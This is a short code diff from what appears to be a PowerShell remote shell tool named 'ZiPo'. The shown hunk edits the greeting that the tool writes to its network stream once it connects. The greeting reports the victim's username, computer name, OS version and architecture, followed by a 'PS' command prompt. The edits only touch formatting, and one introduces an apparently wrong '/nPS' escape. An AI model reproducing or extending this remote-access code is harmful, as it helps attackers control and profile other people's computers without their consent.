@@ -41,10 +41,10 @@ ${esc}[31m
 ${esc}[32m[+] ZiPo Connected :: $env:USERNAME@$env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
 Architecture: $env:PROCESSOR_ARCHITECTURE${esc}[0m
-------------------------------------------------------------\n
+------------------------------------------------------------
 "@
 
-            $intro = $clear + $banner + "nPS " + (Get-Location) + "> "
+            $intro = $clear + $banner + "/nPS " + (Get-Location) + "> "
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
